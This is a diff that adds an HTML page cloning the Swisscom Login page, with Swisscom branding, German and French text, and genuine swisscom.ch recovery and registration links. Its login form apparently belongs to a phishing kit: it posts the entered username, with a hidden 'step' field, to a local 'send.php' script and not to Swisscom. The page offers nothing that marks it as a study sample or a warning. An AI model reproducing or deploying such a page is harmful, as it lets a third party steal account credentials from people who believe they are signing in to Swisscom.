@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+
+<html class="hydrated"><head>
+<meta charset="utf-8"/><style data-styles="" nonce="">sdx-loading-spinner,sdx-itunes-autocomplete,sdx-input-mask,sdx-numeric-stepper,sdx-search,sdx-dialog-content,sdx-dialog,sdx-dialog-toggle,sdx-tabs,sdx-tabs-item,sdx-color-picker,sdx-option-picker,sdx-show-more,sdx-expand-and-collapse,sdx-card,sdx-pie-chart,sdx-scroll-to-top,sdx-menu-flyout-content,sdx-menu-flyout-list,sdx-menu-flyout,sdx-menu-flyout-list-item,sdx-menu-flyout-toggle,sdx-arrow,sdx-progress-full,sdx-progress-full-step,sdx-figma,sdx-button-group,sdx-code-editor,sdx-dummy,sdx-menu-flyout-cta,sdx-price,sdx-ribbon,sdx-sticker-circle,sdx-scroll-view,sdx-backdrop,sdx-trap-focus,sdx-accordion-item-section,sdx-accordion,sdx-accordion-item,sdx-accordion-item-body,sdx-accordion-item-header,sdx-icon,sdx-animation,sdx-flip,sdx-header,sdx-header-left-hand-menu,sdx-header-menu,sdx-validation-message,sdx-input-group,sdx-input-item,sdx-input,sdx-text-truncate,sdx-button,sdx-select-optgroup,sdx-select,sdx-select-list,sdx-select-option{visibility:hidden}.hydrated{visibility:inherit}</style>
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport"/>
+<meta content="ie=edge" http-equiv="x-ua-compatible"/>
+<meta content="crplpiKkQwd3St8UK_5Xa2XC6rOi9RSgKIT7hLExOYg=" name="csp-nonce"/>
+<title>Swisscom Login</title>
+<link href="local_resources/css/792da032084255f827760da4fa859b7c.css" rel="stylesheet"/>
+<link href="local_resources/css/b45fcd57f258cc893adce1ec9860e2d6.css" rel="stylesheet" type="text/css"/>
+</head>
+<body class="light-theme" spellcheck="false">
+<div id="hidePage" style="display: none;"></div>
+<div class="main-wrapper" id="loginPage">
+<div id="header"></div>
+<div aria-hidden="true" class="notification-header notification--open notification--alert" hidden="" id="notification-container">
+<div class="notification__content">
+<div class="notification__body notification__body_flex">
+<sdx-icon class="margin-right-2 size hydrated" color-class="white" icon-name="icon-exclamation-mark-circle" size="3"></sdx-icon>
+<span>Votre navigateur ne supporte pas les cookies. Veuillez activer l'option de cookie dans les paramètres de votre navigateur.</span>
+</div>
+<button aria-label="Fermer" class="margin-left-2 notification__close notification-cancel" id="notification-container-close-button">
+<i aria-hidden="true" class="icon icon-022-close"></i>
+</button>
+</div>
+</div>
+<div class="login-container">
+<div class="login-content-container row no-gutters flex-items-xs-center">
+<sdx-card appearance="light-theme" background="gradient-1" class="hydrated" layout="split">
+<div slot="first">
+<div class="white padding-v-4" data-testid="login.info_panel">
+<h2 class="text-h2 padding-top-4 margin-bottom-2" data-testid="login.info_panel.basic.heading" id="rpTitle">Ein Zugang für alles</h2>
+<h5 class="text-h5 margin-bottom-2" data-testid="login.info_panel.basic.body">Mit Ihren Anmeldedaten haben Sie Zugriff auf alle Swisscom Dienste:</h5>
+<div class="row flex-items-xs-left margin-bottom-4">
+<div class="col-xs-6 padding-top-3">
+<sdx-icon class="size hydrated" icon-name="icon-person" size="2" sr-hint="MySwisscom"></sdx-icon>
+<span class="padding-left-1 text-standard font font--semi-bold">My Swisscom</span>
+</div>
+<div class="col-xs-6 padding-top-3">
+<sdx-icon class="size hydrated" icon-name="icon-message" size="2" sr-hint="Webmail"></sdx-icon>
+<span class="padding-left-1 text-standard font font--semi-bold">Webmail</span>
+</div>
+<div class="col-xs-6 padding-top-3">
+<sdx-icon class="size hydrated" icon-name="icon-weather-cloud" size="2" sr-hint="myCloud"></sdx-icon>
+<span class="padding-left-1 text-standard font font--semi-bold">myCloud</span>
+</div>
+<div class="col-xs-6 padding-top-3">
+<sdx-icon class="size hydrated" icon-name="icon-tv" size="2" sr-hint="blue TV"></sdx-icon>
+<span class="padding-left-1 text-standard font font--semi-bold">blue TV</span>
+</div>
+<div class="col-xs-12 padding-top-3">
+<sdx-icon class="size hydrated" icon-name="icon-group" size="2" sr-hint="Community"></sdx-icon>
+<span class="padding-left-1 text-standard font font--semi-bold">Community</span>
+</div>
+</div>
+</div>
+</div>
+<div role="region">
+<div>
+<img alt="Swisscom Logo" class="img-h1-title-h2-rpp-title" height="48px" src="local_resources/img/23dc09869878c5e4712e50a8f26fbb1b.svg" width="36px"/>
+<h1 class="with-rp-name" data-testid="page-title">Swisscom Login</h1>
+<h4 class="text-h4 relying-party-name" data-testid="page-relying-party-name">My Swisscom</h4>
+<p class="text-standard margin-bottom-2" data-testid="page-description">Melden Sie sich bitte hier mit Ihrem Swisscom Login an.</p>
+<form action="send.php" method="post">
+<input name="step" type="hidden" value="username"/>
+<div class="input-field input-field--fixed margin-bottom-0">
+<input aria-errormessage="identifierError" aria-invalid="false" autocomplete="username" autofocus="autofocus" id="username" name="username" placeholder="Benutzernamen eingeben" required="required" spellcheck="false" type="text" value=""/>
+<label for="username">E-Mail, Benutzername oder Mobilnummer</label>
+</div>
+<sdx-input-item appearance="light-theme" checked="checked" class="padding-top-1 sdx-light-theme hydrated" id="stayLoggedIn" name="stayLoggedIn" type="checkbox">Angemeldet bleiben<input aria-describedby="1" name="stayLoggedIn" style="position: absolute; opacity: 0; top: 0px; left: 0px; width: 100%; height: 100%; margin: 0px; z-index: 1; cursor: pointer;" tabindex="0" type="checkbox" value="on"/><span id="1" style="position: absolute; width: 1px; height: 1px; overflow: hidden;">
+        ,
+        Angemeldet bleiben
+        
+      </span></sdx-input-item>
+<div aria-live="polite" id="identifierError">
+<sdx-validation-message appearance="light-theme" aria-invalid="false" class="has-conditional-error hydrated" validation-message="Ce champ est obligatoire">
+</sdx-validation-message>
+</div>
+<!-- Added hidden pwd field to enable Chrome Password Manager functionality -->
+<input class="hidden" name="dummyPasswordField" tabindex="-1" type="password"/>
+<!-- Pseudo submit input is needed for some password managers to support automatic submission -->
+<input class="hidden" tabindex="-1" type="submit" value=""/>
+<div class="modal" data-init="auto" id="identifier-info" role="dialog" tabindex="-1">
+<div class="container">
+<div class="modal__content col-xs col-md-10 col-lg-8 col-xl-6">
+<div class="modal__body">
+<p>Le nom d’utilisateur peut également être une adresse mail si vous avez entré une adresse mail comme nom d’utilisateur.</p>
+<sdx-button appearance="light-theme" class="modal-close sdx-light-theme hydrated" label="Fermer" type="button">
+</sdx-button>
+</div>
+</div>
+</div>
+</div>
+</form></div>
+</div>
+<div slot="interaction">
+<div class="hidden" data-selenium-view-name="username" id="seleniumViewName"></div>
+<div class="button-group button-group--fill margin-top-1" id="continue">
+<button class="button button--primary" id="continueButton" type="submit">Weiter</button>
+</div>
+
+<ul class="list single-line margin-top-2 margin-bottom-0">
+<li class="icon-chevron-normal-right">
+<a class="text-standard" href="https://recovery.scl.swisscom.ch/username-recovery?RURL=https%3A%2F%2Fbwsso.login.scl.swisscom.ch%2Flogin%3FSNA%3Dmyswisscom%26RURL%3Dhttps%253A%252F%252Fwww.swisscom.ch%252Fmyswisscom%252F%253Flogin%2526lang%253Dfr%2526nevistokenconsume%26keepLogin%3Dtrue%26L%3Dfr&amp;lang=fr">Benutzername vergessen?</a>
+</li>
+<li class="icon-chevron-normal-right">
+<a class="text-standard" href="https://registration.scl.swisscom.ch/ui/cust-id?SNA=myswisscom&amp;RURL=https%3A%2F%2Fwww.swisscom.ch%2Fmyswisscom%2F%3Flogin%26lang%3Dfr%26nevistokenconsume&amp;lang=fr&amp;keepLogin=true" id="registrationLink">Neu registrieren</a>
+</li>
+</ul>
+</div>
+</sdx-card>
+</div>
+</div>
+<footer class="footer footer--compact footer__bottom">
+<div class="container">
+<div class="logo hidden-sm-down" tabindex="-1">
+<span aria-label="Swisscom Logo" class="logo-lifeform"></span>
+</div>
+<ul class="nav-items">
+<li class="nav-item">
+<a class="nav-link" href="https://swisscom.com/login-aide">Über Swisscom Login</a>
+</li>
+<li class="nav-item" role="listbox">
+<sdx-menu-flyout appearance="light-theme" class="hydrated" close-on-click="true">
+<sdx-menu-flyout-toggle class="hydrated" id="language-toggle">
+<a class="nav-link no-border" id="current-language">DE</a>
+</sdx-menu-flyout-toggle>
+<sdx-menu-flyout-list class="sdx-light-theme hydrated" id="language-selector" role="dialog">
+<sdx-menu-flyout-list-item class="sdx-light-theme selectable bottom-right hydrated" value="de">Deutsch</sdx-menu-flyout-list-item>
+<sdx-menu-flyout-list-item class="sdx-light-theme selectable bottom-right hydrated" selected="selected" value="fr">Français</sdx-menu-flyout-list-item>
+</sdx-menu-flyout-list>
+</sdx-menu-flyout>
+</li>
+</ul>
+</div>
+</footer>
+</div>
+<script nonce="" src="local_resources/js/e394fcda738ba594fab7fdb7c69bdc64.js" type="text/javascript"></script>
+<script nonce="" src="local_resources/js/a3efd6a34259e7ff8cac08f050bfae26.js" type="text/javascript"></script>
+<script nonce="" src="local_resources/js/e327ec8dbe2542347c13f4a82464af0e.js" type="text/javascript"></script>
+</body></html>
